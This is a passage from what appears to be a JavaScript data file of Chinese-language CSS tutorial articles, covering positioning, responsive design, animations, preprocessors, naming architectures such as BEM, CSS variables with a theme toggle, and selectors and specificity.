  background-color: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s, visibility 0.3s;
}

.modal-overlay.active {
  opacity: 1;
  visibility: visible;
}

/* 模态框内容 */
.modal {
  position: relative;
  width: 90%;
  max-width: 600px;
  max-height: 90vh;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  overflow-y: auto;
  transform: translateY(-20px);
  transition: transform 0.3s;
}

.modal-overlay.active .modal {
  transform: translateY(0);
}

.modal-header {
  padding: 20px;
  border-bottom: 1px solid #eee;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.modal-title {
  margin: 0;
  font-size: 20px;
  font-weight: 600;
}

.modal-close {
  background: none;
  border: none;
  font-size: 24px;
  cursor: pointer;
  color: #999;
  transition: color 0.3s;
}

.modal-close:hover {
  color: #333;
}

.modal-body {
  padding: 20px;
}

.modal-footer {
  padding: 20px;
  border-top: 1px solid #eee;
  display: flex;
  justify-content: flex-end;
  gap: 10px;
}
\`\`\`

#### 固定导航栏

\`\`\`css
/* 固定定位：固定导航栏 */
.navbar {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  height: 60px;
  background-color: #333;
  color: white;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 20px;
}

/* 需要为 body 添加 padding-top，避免内容被遮挡 */
body {
  padding-top: 60px;
}

/* 返回顶部按钮 */
.back-to-top {
  position: fixed;
  bottom: 20px;
  right: 20px;
  width: 50px;
  height: 50px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 50%;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
  z-index: 1000;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s, visibility 0.3s;
}

.back-to-top.visible {
  opacity: 1;
  visibility: visible;
}
\`\`\`

### 最佳实践

- 优先使用 Flexbox 和 Grid 布局
- 定位用于特殊场景（弹出层、固定元素）
- 合理使用 z-index，避免过大值
- 注意定位对文档流的影响
- 测试不同屏幕尺寸下的表现
- 使用语义化的 HTML 结构
- 为固定元素预留空间（padding-top）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-responsive",title:"响应式设计与媒体查询",category:"css",difficulty:"medium",tags:["CSS","响应式","媒体查询","移动端"],content:`## 响应式设计与媒体查询

响应式设计是现代网页开发的标准实践，确保网站在不同设备和屏幕尺寸上都能良好显示。

### 媒体查询基础

**基本语法：**
- @media media-type and (media-feature) { ... }
- 媒体类型：screen、print、speech、all
- 媒体特性：width、height、orientation 等

**常用媒体特性：**
- min-width：最小宽度
- max-width：最大宽度
- min-height：最小高度
- max-height：最大高度
- orientation：方向（portrait/landscape）
- aspect-ratio：宽高比

**逻辑运算符：**
- and：同时满足多个条件
- not：否定媒体查询
- only：仅适用于特定媒体类型
- ,（逗号）：或关系

### 代码示例

#### 移动优先策略

\`\`\`css
/* 移动优先：从小屏幕开始，逐步增强 */
.container {
  width: 100%;
  padding: 10px;
}

/* 平板 */
@media (min-width: 768px) {
  .container {
    width: 750px;
    margin: 0 auto;
    padding: 20px;
  }
}

/* 桌面 */
@media (min-width: 1024px) {
  .container {
    width: 970px;
  }
}

/* 大屏桌面 */
@media (min-width: 1200px) {
  .container {
    width: 1170px;
  }
}
\`\`\`

#### 响应式导航栏

\`\`\`css
/* 基础样式 */
.navbar {
  background-color: #333;
  color: white;
  padding: 1rem 2rem;
}

.nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  max-width: 1200px;
  margin: 0 auto;
}

.nav-brand {
  font-size: 1.5rem;
  font-weight: bold;
}

.nav-menu {
  display: flex;
  list-style: none;
  margin: 0;
  padding: 0;
  gap: 2rem;
}

.nav-menu li a {
  color: white;
  text-decoration: none;
  transition: color 0.3s;
}

.nav-menu li a:hover {
  color: #007bff;
}

/* 汉堡菜单按钮（默认隐藏） */
.nav-toggle {
  display: none;
  background: none;
  border: none;
  color: white;
  font-size: 1.5rem;
  cursor: pointer;
}

/* 平板和手机 */
@media (max-width: 768px) {
  .nav-toggle {
    display: block;
  }

  .nav-menu {
    position: absolute;
    top: 100%;
    left: 0;
    right: 0;
    background-color: #333;
    flex-direction: column;
    padding: 1rem 2rem;
    gap: 1rem;
    display: none;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
  }

  .nav-menu.active {
    display: flex;
  }

  .nav-menu li {
    width: 100%;
  }

  .nav-menu li a {
    display: block;
    padding: 0.5rem 0;
  }
}
\`\`\`

### 最佳实践

- 采用移动优先策略
- 使用相对单位
- 测试真实设备
- 优化图片加载
- 考虑触摸交互
- 保持内容可读性
- 性能优化（避免过多媒体查询）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-animation",title:"CSS 动画与过渡效果",category:"css",difficulty:"medium",tags:["CSS","动画","transition","animation"],content:`## CSS 动画与过渡效果

CSS 动画和过渡为网页增添交互性和视觉吸引力，提升用户体验。

### 过渡效果（Transition）

**基本属性：**
- transition-property：指定过渡的 CSS 属性
- transition-duration：过渡持续时间
- transition-timing-function：时间函数
- transition-delay：延迟时间
- transition：简写属性

**时间函数：**
- ease：默认值，慢-快-慢
- linear：匀速
- ease-in：慢开始
- ease-out：慢结束
- ease-in-out：慢-快-慢
- cubic-bezier()：自定义贝塞尔曲线

**可过渡属性：**
- 尺寸属性：width、height、top、left
- 外观属性：color、background、opacity
- 变换属性：transform
- 注意：display、visibility 不能直接过渡

### 关键帧动画（Animation）

**基本属性：**
- animation-name：关键帧名称
- animation-duration：动画持续时间
- animation-timing-function：时间函数
- animation-delay：延迟时间
- animation-iteration-count：播放次数
- animation-direction：播放方向
- animation-fill-mode：填充模式
- animation-play-state：播放状态
- animation：简写属性

**@keyframes 规则：**
- 定义动画的关键帧
- from/to 或百分比
- 可以定义多个关键帧

**动画控制：**
- infinite：无限循环
- alternate：往返播放
- forwards：保持结束状态
- paused：暂停动画

### 代码示例

#### 按钮过渡效果

\`\`\`css
.button {
  padding: 12px 24px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  background-color: #0056b3;
  transform: translateY(-2px);
  box-shadow: 0 4px 8px rgba(0,0,0,0.2);
}

.button:active {
  transform: translateY(0);
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}
\`\`\`

#### 加载动画

\`\`\`css
/* 旋转加载器 */
.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #007bff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* 脉冲加载器 */
.pulse {
  width: 40px;
  height: 40px;
  background-color: #007bff;
  border-radius: 50%;
  animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
  0% {
    transform: scale(0.95);
    box-shadow: 0 0 0 0 rgba(0, 123, 255, 0.7);
  }
  70% {
    transform: scale(1);
    box-shadow: 0 0 0 10px rgba(0, 123, 255, 0);
  }
  100% {
    transform: scale(0.95);
    box-shadow: 0 0 0 0 rgba(0, 123, 255, 0);
  }
}
\`\`\`

#### 动画性能优化

\`\`\`css
/* 使用 GPU 加速的属性 */
.gpu-accelerated {
  transform: translate3d(0, 0, 0);
  opacity: 1;
}

/* will-change 提示浏览器优化 */
.animated-element {
  will-change: transform, opacity;
  animation: move 2s ease-in-out;
}

@keyframes move {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(100px);
  }
}

/* 动画完成后移除 will-change */
.animated-element.finished {
  will-change: auto;
}

/* 避免动画的属性（会触发重排） */
.bad-performance {
  /* 避免动画这些属性 */
  /* width, height, padding, margin */
  /* top, left, right, bottom */
  /* border-width */
}

/* 好的性能（只触发重绘和合成） */
.good-performance {
  /* 动画这些属性 */
  transform: translateX(100px);
  opacity: 0.5;
  filter: blur(5px);
}
\`\`\`

#### 减少动画偏好

\`\`\`css
/* 尊重用户的动画偏好 */
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}

/* 或者完全禁用动画 */
@media (prefers-reduced-motion: reduce) {
  .animated-element {
    animation: none;
    transition: none;
  }
}
\`\`\`

### 最佳实践

- 优先使用 transform 和 opacity
- 合理使用 will-change
- 提供减少动画选项（prefers-reduced-motion）
- 测试性能影响
- 保持动画简洁有意义
- 注意可访问性
- 使用硬件加速`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-preprocessors",title:"CSS 预处理器与后处理器",category:"css",difficulty:"medium",tags:["CSS","Sass","Less","PostCSS"],content:`## CSS 预处理器与后处理器

CSS 预处理器和后处理器扩展了 CSS 的功能，提高了开发效率和代码可维护性。

### Sass/SCSS

**变量：**
- $primary-color: #007bff;
- 支持各种数据类型
- 作用域：全局和局部

**嵌套：**
- 选择器嵌套
- 属性嵌套
- & 父选择器引用

**混合（Mixins）：**
- @mixin 定义
- @include 调用
- 支持参数和默认值

**继承：**
- @extend 继承选择器
- %placeholder 占位符
- 避免代码重复

**函数：**
- 内置函数：color、string、math
- 自定义函数：@function
- 返回值使用 @return

**控制指令：**
- @if、@else if、@else
- @for、@each、@while
- 逻辑控制流程

**模块化：**
- @import 导入（已废弃）
- @use 使用模块
- @forward 转发模块

### Less

**变量：**
- @primary-color: #007bff;
- 延迟加载
- 作用域规则

**混合：**
- .mixin() 定义和调用
- 支持参数
- 带条件的混合

**嵌套：**
- 选择器嵌套
- & 父选择器
- 媒体查询嵌套

**函数：**
- 内置函数
- 命名空间
- JavaScript 表达式

**导入：**
- @import 导入文件
- 导入选项

### PostCSS

**概念：**
- 用 JavaScript 工具和插件转换 CSS
- 解析 CSS 为 AST
- 插件生态系统

**常用插件：**
- autoprefixer：自动添加浏览器前缀
- postcss-preset-env：现代 CSS 特性
- cssnano：CSS 压缩
- postcss-import：导入文件
- tailwindcss：实用工具类框架

**配置：**
- postcss.config.js
- 插件顺序
- 选项配置

### 代码示例

#### Sass 变量和嵌套

\`\`\`scss
// 变量定义
$primary-color: #007bff;
$secondary-color: #6c757d;
$font-size-base: 16px;
$spacing-unit: 8px;

// 嵌套选择器
.card {
  background-color: white;
  border-radius: 8px;
  padding: $spacing-unit * 2;

  &__header {
    padding: $spacing-unit;
    border-bottom: 1px solid #eee;

    &--highlight {
      background-color: $primary-color;
      color: white;
    }
  }

  &__body {
    padding: $spacing-unit * 2;

    p {
      margin: 0 0 $spacing-unit 0;
      line-height: 1.6;
    }
  }

  &__footer {
    padding: $spacing-unit;
    border-top: 1px solid #eee;
    text-align: right;

    .button {
      margin-left: $spacing-unit;
    }
  }

  &:hover {
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }
}
\`\`\`

#### Sass 混合（Mixins）

\`\`\`scss
// 定义混合
@mixin button($bg-color: $primary-color, $text-color: white) {
  padding: 10px 20px;
  background-color: $bg-color;
  color: $text-color;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s ease;

  &:hover {
    background-color: darken($bg-color, 10%);
  }

  &:active {
    transform: translateY(1px);
  }
}

// 使用混合
.button-primary {
  @include button();
}

.button-secondary {
  @include button($secondary-color);
}

.button-success {
  @include button(#28a745);
}

// 响应式混合
@mixin respond-to($breakpoint) {
  @if $breakpoint == 'small' {
    @media (max-width: 640px) {
      @content;
    }
  } @else if $breakpoint == 'medium' {
    @media (max-width: 768px) {
      @content;
    }
  } @else if $breakpoint == 'large' {
    @media (max-width: 1024px) {
      @content;
    }
  }
}

.container {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 20px;

  @include respond-to('small') {
    padding: 10px;
  }

  @include respond-to('medium') {
    padding: 15px;
  }
}
\`\`\`

#### PostCSS 配置

\`\`\`javascript
// postcss.config.js
module.exports = {
  plugins: [
    // 自动添加浏览器前缀
    require('autoprefixer')({
      overrideBrowserslist: [
        '> 1%',
        'last 2 versions',
        'not dead'
      ]
    }),
    
    // 现代CSS特性
    require('postcss-preset-env')({
      stage: 3,
      features: {
        'nesting-rules': true
      }
    }),
    
    // CSS压缩
    require('cssnano')({
      preset: 'default'
    })
  ]
};
\`\`\`

### 比较与选择

**Sass vs Less：**
- Sass 功能更强大
- Less 更接近 CSS 语法
- Sass 社区更活跃
- 两者都广泛使用

**预处理器 vs PostCSS：**
- 预处理器：扩展语法
- PostCSS：转换和优化
- 可以结合使用

**选择建议：**
- 新项目推荐 Sass/SCSS
- 需要现代 CSS 特性用 PostCSS
- 大型项目考虑 CSS-in-JS

### 最佳实践

- 建立变量命名规范
- 合理使用嵌套（不超过 3 层）
- 混合 vs 继承的选择
- 模块化管理样式
- 编译后的代码检查
- 版本控制原始文件
- 文档化预处理器代码`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-architecture",title:"CSS 架构与命名规范",category:"css",difficulty:"medium",tags:["CSS","BEM","OOCSS","架构"],content:`## CSS 架构与命名规范

良好的 CSS 架构和命名规范对于大型项目的可维护性至关重要，可以避免样式冲突和提高代码复用性。

### BEM 命名规范

**概念：**
- Block（块）：独立的组件
- Element（元素）：块的组成部分
- Modifier（修饰符）：块或元素的状态

**命名规则：**
- Block：.block
- Element：.block__element
- Modifier：.block--modifier 或 .block__element--modifier

**示例：**
- .button（块）
- .button__icon（元素）
- .button--primary（修饰符）
- .button__icon--large（元素修饰符）

**优点：**
- 清晰的结构关系
- 避免命名冲突
- 易于理解和维护

### OOCSS（面向对象的 CSS）

**原则：**
- 分离结构和外观
- 分离容器和内容

**结构类：**
- 定义布局结构
- 如：.layout、.grid、.column

**外观类：**
- 定义视觉样式
- 如：.skin、.theme-blue

**示例：**
- 结构：.media { display: flex; }
- 外观：.media--bordered { border: 1px solid; }

### SMACSS（可扩展的模块化 CSS 架构）

**分类：**
- Base：基础样式（重置、元素默认样式）
- Layout：布局样式（网格、容器）
- Module：模块样式（可复用组件）
- State：状态样式（激活、禁用）
- Theme：主题样式（颜色、字体）

**命名约定：**
- Layout：l- 或 layout-
- State：is- 或 has-
- Theme：theme-

### ITCSS（倒三角 CSS）

**层次结构：**
1. Settings：变量和配置
2. Tools：混合和函数
3. Generic：重置和标准化
4. Elements：裸元素样式
5. Objects：布局结构
6. Components：UI 组件
7. Utilities：辅助类

**特点：**
- 从通用到具体
- 低特异性到高特异性
- 易于维护和扩展

### 实用工具类（Utility-First）

**概念：**
- 小而单一用途的类
- 组合构建复杂 UI
- 如 Tailwind CSS

**示例：**
- .p-4 { padding: 1rem; }
- .text-center { text-align: center; }
- .flex { display: flex; }

**优点：**
- 开发速度快
- 文件大小可控（PurgeCSS）
- 设计一致性

### CSS-in-JS

**概念：**
- 在 JavaScript 中编写 CSS
- 组件级样式隔离
- 动态样式支持

**方案：**
- Styled-components
- Emotion
- CSS Modules
- JSS

**优点：**
- 真正的样式隔离
- 动态主题
- 代码组织清晰

### 代码示例

#### BEM 命名示例

\`\`\`css
/* 块 */
.card {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
}

/* 元素 */
.card__header {
  margin-bottom: 15px;
  padding-bottom: 15px;
  border-bottom: 1px solid #eee;
}

.card__title {
  margin: 0;
  font-size: 1.25rem;
  font-weight: 600;
}

.card__body {
  margin-bottom: 15px;
}

.card__text {
  margin: 0 0 10px 0;
  line-height: 1.6;
  color: #666;
}

.card__footer {
  display: flex;
  justify-content: flex-end;
  gap: 10px;
}

/* 修饰符 */
.card--featured {
  border: 2px solid #007bff;
}

.card--compact {
  padding: 10px;
}

.card__title--large {
  font-size: 1.5rem;
}

/* HTML 使用 */
<div class="card card--featured">
  <div class="card__header">
    <h2 class="card__title card__title--large">标题</h2>
  </div>
  <div class="card__body">
    <p class="card__text">内容文本</p>
  </div>
  <div class="card__footer">
    <button class="card__button">按钮</button>
  </div>
</div>
\`\`\`

#### OOCSS 示例

\`\`\`css
/* 结构类 */
.media {
  display: flex;
  align-items: flex-start;
}

.media__object {
  margin-right: 1rem;
}

.media__body {
  flex: 1;
  overflow: hidden;
}

/* 外观类 */
.media--bordered {
  border: 1px solid #ddd;
  padding: 1rem;
  border-radius: 4px;
}

.media--spaced {
  margin-bottom: 1rem;
}

/* 组合使用 */
<div class="media media--bordered media--spaced">
  <img class="media__object" src="avatar.jpg" alt="头像">
  <div class="media__body">
    <h3>标题</h3>
    <p>内容文本</p>
  </div>
</div>
\`\`\`

#### SMACSS 示例

\`\`\`css
/* Base - 基础样式 */
* {
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  line-height: 1.6;
  color: #333;
}

/* Layout - 布局样式 */
.l-container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 20px;
}

.l-grid {
  display: grid;
  gap: 20px;
}

/* Module - 模块样式 */
.card {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
}

.button {
  padding: 10px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.3s ease;
}

/* State - 状态样式 */
.is-active {
  background-color: #007bff;
  color: white;
}

.is-hidden {
  display: none;
}

.is-disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Theme - 主题样式 */
.theme-dark {
  background-color: #1a1a1a;
  color: #fff;
}

.theme-light {
  background-color: #fff;
  color: #333;
}
\`\`\`

#### 实用工具类示例

\`\`\`css
/* 间距工具类 */
.p-1 { padding: 0.25rem; }
.p-2 { padding: 0.5rem; }
.p-3 { padding: 1rem; }
.p-4 { padding: 1.5rem; }

.m-1 { margin: 0.25rem; }
.m-2 { margin: 0.5rem; }
.m-3 { margin: 1rem; }
.m-4 { margin: 1.5rem; }

/* 文本工具类 */
.text-center { text-align: center; }
.text-left { text-align: left; }
.text-right { text-align: right; }

.text-sm { font-size: 0.875rem; }
.text-base { font-size: 1rem; }
.text-lg { font-size: 1.125rem; }
.text-xl { font-size: 1.25rem; }

/* 颜色工具类 */
.text-primary { color: #007bff; }
.text-secondary { color: #6c757d; }
.text-success { color: #28a745; }
.text-danger { color: #dc3545; }

.bg-primary { background-color: #007bff; }
.bg-secondary { background-color: #6c757d; }
.bg-success { background-color: #28a745; }
.bg-danger { background-color: #dc3545; }

/* 布局工具类 */
.flex { display: flex; }
.flex-col { flex-direction: column; }
.items-center { align-items: center; }
.justify-center { justify-content: center; }
.justify-between { justify-content: space-between; }

/* 组合使用 */
<div class="p-4 bg-white rounded shadow">
  <h2 class="text-xl text-primary mb-2">标题</h2>
  <p class="text-base text-secondary mb-4">内容文本</p>
  <div class="flex justify-between">
    <button class="px-4 py-2 bg-primary text-white rounded">确定</button>
    <button class="px-4 py-2 bg-secondary text-white rounded">取消</button>
  </div>
</div>
\`\`\`

### 文件组织

**按功能组织：**
- components/
- layouts/
- pages/
- utilities/

**按类型组织：**
- base/
- components/
- layouts/
- themes/

**ITCSS 组织：**
- settings/
- tools/
- generic/
- elements/
- objects/
- components/
- utilities/

### 最佳实践

- 选择适合的命名规范
- 建立样式指南
- 使用 CSS 变量
- 避免深度选择器
- 定期重构和清理
- 文档化样式系统
- 团队协作规范`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-variables",title:"CSS 自定义属性（变量）",category:"css",difficulty:"easy",tags:["CSS","变量","自定义属性","主题"],content:`## CSS 自定义属性（变量）

CSS 自定义属性（CSS Variables）允许定义可复用的值，提高代码的可维护性和灵活性。

### 基本语法

**定义变量：**
- --variable-name: value;
- 必须在规则集内定义
- 通常定义在 :root 中作为全局变量

**使用变量：**
- var(--variable-name)
- var(--variable-name, fallback)
- 支持回退值

**示例：**
\`\`\`css
:root {
  --primary-color: #007bff;
  --font-size: 16px;
}

.button {
  background-color: var(--primary-color);
  font-size: var(--font-size);
}
\`\`\`

### 作用域和继承

**全局变量：**
- 定义在 :root 中
- 整个文档可用
- 如：--primary-color

**局部变量：**
- 定义在特定选择器中
- 仅在该选择器及其后代中可用
- 可以覆盖全局变量

**继承：**
- 变量遵循 CSS 继承规则
- 子元素继承父元素的变量值
- 可以重新定义覆盖

### 代码示例

#### 定义和使用变量

\`\`\`css
/* 全局变量 */
:root {
  /* 颜色 */
  --primary-color: #007bff;
  --secondary-color: #6c757d;
  --success-color: #28a745;
  --danger-color: #dc3545;
  --warning-color: #ffc107;
  
  /* 字体 */
  --font-family-base: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  --font-size-base: 16px;
  --font-size-large: 1.25rem;
  --font-size-small: 0.875rem;
  
  /* 间距 */
  --spacing-unit: 8px;
  --spacing-sm: var(--spacing-unit);
  --spacing-md: calc(var(--spacing-unit) * 2);
  --spacing-lg: calc(var(--spacing-unit) * 3);
  
  /* 边框 */
  --border-radius: 4px;
  --border-width: 1px;
  --border-color: #dee2e6;
  
  /* 阴影 */
  --box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  --box-shadow-lg: 0 4px 8px rgba(0,0,0,0.15);
}

/* 使用变量 */
.button {
  padding: var(--spacing-md) var(--spacing-lg);
  background-color: var(--primary-color);
  color: white;
  border: none;
  border-radius: var(--border-radius);
  font-family: var(--font-family-base);
  font-size: var(--font-size-base);
  box-shadow: var(--box-shadow);
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  background-color: var(--primary-color);
  box-shadow: var(--box-shadow-lg);
}

.button--secondary {
  background-color: var(--secondary-color);
}

.button--success {
  background-color: var(--success-color);
}

.button--danger {
  background-color: var(--danger-color);
}
\`\`\`

#### 主题切换

\`\`\`css
/* 浅色主题（默认） */
:root {
  --bg-primary: #ffffff;
  --bg-secondary: #f8f9fa;
  --text-primary: #212529;
  --text-secondary: #6c757d;
  --border-color: #dee2e6;
  --shadow-color: rgba(0, 0, 0, 0.1);
}

/* 深色主题 */
[data-theme="dark"] {
  --bg-primary: #1a1a1a;
  --bg-secondary: #2d2d2d;
  --text-primary: #ffffff;
  --text-secondary: #b0b0b0;
  --border-color: #404040;
  --shadow-color: rgba(0, 0, 0, 0.3);
}

/* 使用变量 */
body {
  background-color: var(--bg-primary);
  color: var(--text-primary);
  transition: background-color 0.3s, color 0.3s;
}

.card {
  background-color: var(--bg-secondary);
  border: 1px solid var(--border-color);
  box-shadow: 0 2px 4px var(--shadow-color);
  color: var(--text-primary);
}

.text-secondary {
  color: var(--text-secondary);
}

/* JavaScript 切换主题 */
function toggleTheme() {
  const currentTheme = document.documentElement.getAttribute('data-theme');
  const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', newTheme);
  localStorage.setItem('theme', newTheme);
}

// 初始化主题
const savedTheme = localStorage.getItem('theme') || 'light';
document.documentElement.setAttribute('data-theme', savedTheme);
\`\`\`

#### 与 calc() 结合使用

\`\`\`css
:root {
  --spacing-unit: 8px;
  --border-width: 2px;
  --font-size: 16px;
}

.card {
  /* 使用 calc() 计算值 */
  padding: calc(var(--spacing-unit) * 2);
  margin: calc(var(--spacing-unit) * 1.5);
  border: var(--border-width) solid #ddd;
  font-size: calc(var(--font-size) * 1.125);
}

/* 复杂计算 */
.grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: calc(var(--spacing-unit) * 2);
}

@media (max-width: 768px) {
  .grid {
    grid-template-columns: repeat(2, 1fr);
    gap: calc(var(--spacing-unit) * 1.5);
  }
}
\`\`\`

### 与预处理器变量的区别

**CSS 变量：**
- 运行时生效
- 可以动态修改
- 遵循级联和继承
- 需要浏览器支持

**Sass/Less 变量：**
- 编译时确定
- 不能运行时修改
- 无继承概念
- 编译为静态值

### 浏览器支持

**支持情况：**
- 现代浏览器完全支持
- IE 不支持
- 可以使用 PostCSS 插件回退

**回退策略：**
- 提供静态回退值
- 使用 PostCSS 插件
- 渐进增强

### 最佳实践

- 使用语义化的变量名
- 建立变量命名规范
- 合理组织全局和局部变量
- 使用回退值
- 结合 calc() 进行计算
- 文档化变量用途
- 定期审查和优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-selectors",title:"CSS 选择器详解",category:"css",difficulty:"easy",tags:["CSS","选择器","优先级"],content:`## CSS 选择器详解

CSS 选择器用于选择要样式化的 HTML 元素，是 CSS 的核心概念之一。

### 基础选择器

**元素选择器：**
- 选择特定类型的元素
- 如：p、div、h1

**类选择器：**
- 选择具有特定类的元素
- 如：.classname
- 一个元素可以有多个类

**ID 选择器：**
- 选择具有特定 ID 的元素
- 如：#idname
- 一个页面中 ID 应该是唯一的

**通用选择器：**
- 选择所有元素
- 如：*
- 通常用于重置样式

**属性选择器：**
- [attr]：具有 attr 属性的元素
- [attr=value]：attr 属性值为 value
- [attr^=value]：attr 属性值以 value 开头
- [attr$=value]：attr 属性值以 value 结尾
- [attr*=value]：attr 属性值包含 value

### 组合选择器

**后代选择器：**
- 选择后代元素
- 如：div p（div 内的所有 p）

**子选择器：**
- 选择直接子元素
- 如：div > p（div 的直接子 p）

**相邻兄弟选择器：**
- 选择紧接在后的兄弟元素
- 如：h1 + p（紧接 h1 的 p）

**通用兄弟选择器：**
- 选择所有后面的兄弟元素
- 如：h1 ~ p（h1 后的所有 p）

**分组选择器：**
- 同时选择多个选择器
- 如：h1, h2, h3

### 伪类选择器

**链接伪类：**
- :link：未访问的链接
- :visited：已访问的链接
- :hover：鼠标悬停
- :active：激活状态

**表单伪类：**
- :focus：获得焦点
- :checked：选中的复选框/单选框
- :disabled：禁用的元素
- :valid/:invalid：验证状态

**位置伪类：**
- :first-child：第一个子元素
- :last-child：最后一个子元素
- :nth-child(n)：第 n 个子元素
- :nth-of-type(n)：第 n 个同类型元素
- :only-child：唯一的子元素

**其他伪类：**
- :not()：否定选择器
- :is()：匹配列表中的任意选择器
- :where()：与 :is() 类似，但优先级为 0
- :has()：父元素选择器（实验性）

### 伪元素选择器

**::before/::after：**
- 在元素内容前后插入内容
- 需要 content 属性
- 常用于装饰

**::first-letter/::first-line：**
- 第一个字母/第一行
- 用于首字下沉等效果

**::selection：**
- 选中的文本
- 自定义选中文本样式

**::placeholder：**
- 输入框的占位符文本

**::marker：**
- 列表项的标记

### 优先级（特异性）

**计算规则：**
- 行内样式：1000
- ID 选择器：100
- 类/属性/伪类：10
- 元素/伪元素：1
- 通用选择器：0

**示例：**
- #nav：100
- .nav .item：20
- div#nav .item a：112

**重要规则：**
- !important 覆盖一切
- 应谨慎使用
- 相同优先级，后定义的规则生效

### 代码示例

#### 基础选择器

\`\`\`css
/* 元素选择器 */
p {
  color: #333;
  line-height: 1.6;
}

h1 {
  font-size: 2rem;
  font-weight: 700;
}

/* 类选择器 */
.button {
  padding: 10px 20px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.button--primary {
  background-color: #007bff;
}

.button--secondary {
  background-color: #6c757d;
}

/* ID 选择器 */
#header {
  background-color: #333;
  color: white;
  padding: 20px;
}

/* 通用选择器 */
* {
  box-sizing: border-box;
}

/* 属性选择器 */
input[type="text"] {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 4px;
}

a[href^="https"] {
  color: #007bff;
}

img[alt*="logo"] {
  border: 2px solid #007bff;
}
\`\`\`

#### 组合选择器

\`\`\`css
/* 后代选择器 */
.container p {
  margin-bottom: 1rem;
}

/* 子选择器 */
.nav > .nav-item {
  padding: 10px;
}

/* 相邻兄弟选择器 */
h1 + p {
  font-size: 1.2rem;
  font-weight: 600;
}

/* 通用兄弟选择器 */
h1 ~ p {
  color: #666;
}

/* 分组选择器 */
h1, h2, h3 {
  font-weight: 700;
  margin-bottom: 0.5rem;
}
\`\`\`

#### 伪类选择器

\`\`\`css
/* 链接伪类 */
a:link {
  color: #007bff;
}

a:visited {
  color: #6c757d;
}

a:hover {
  color: #0056b3;
  text-decoration: underline;
}

a:active {
  color: #004085;
}

/* 表单伪类 */
input:focus {
  outline: 2px solid #007bff;
  outline-offset: 2px;
}

input:checked {
  accent-color: #007bff;
}

input:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* 位置伪类 */
li:first-child {
  font-weight: 700;
}

li:last-child {
  margin-bottom: 0;
}

li:nth-child(2n) {
  background-color: #f5f5f5;
}

li:nth-of-type(3) {
  color: #007bff;
}

/* 其他伪类 */
.nav-item:not(.active) {
  opacity: 0.7;
}

:is(h1, h2, h3) {
  font-weight: 700;
}

/* 父元素选择器 */
article:has(img) {
  padding: 20px;
}
\`\`\`

#### 伪元素选择器

\`\`\`css
/* ::before/::after */
.card::before {
  content: '';
  display: block;
  width: 100%;
  height: 4px;
  background-color: #007bff;
}

.button::after {
  content: ' →';
  margin-left: 5px;
}

/* ::first-letter/::first-line */
.article p::first-letter {
  font-size: 2rem;
  font-weight: 700;
  float: left;
  margin-right: 10px;
}

.article p::first-line {
  font-weight: 600;
  color: #333;
}

/* ::selection */
::selection {
  background-color: #007bff;
  color: white;
}

/* ::placeholder */
input::placeholder {
  color: #999;
  font-style: italic;
}

/* ::marker */
li::marker {
  color: #007bff;
  font-weight: 700;
}
\`\`\`

#### 优先级示例

\`\`\`css
/* 优先级：100 */
#header {
  color: red;
}

/* 优先级：20 */
.nav .item {
  color: blue;
}

/* 优先级：112 */
div#nav .item a {
  color: green;
}

/* 相同优先级，后定义的规则生效 */
.button {
  background-color: #007bff;
}

.button {
  background-color: #0056b3;
}

/* !important 覆盖一切 */
.button {
  background-color: #dc3545 !important;
}
\`\`\`

### 最佳实践

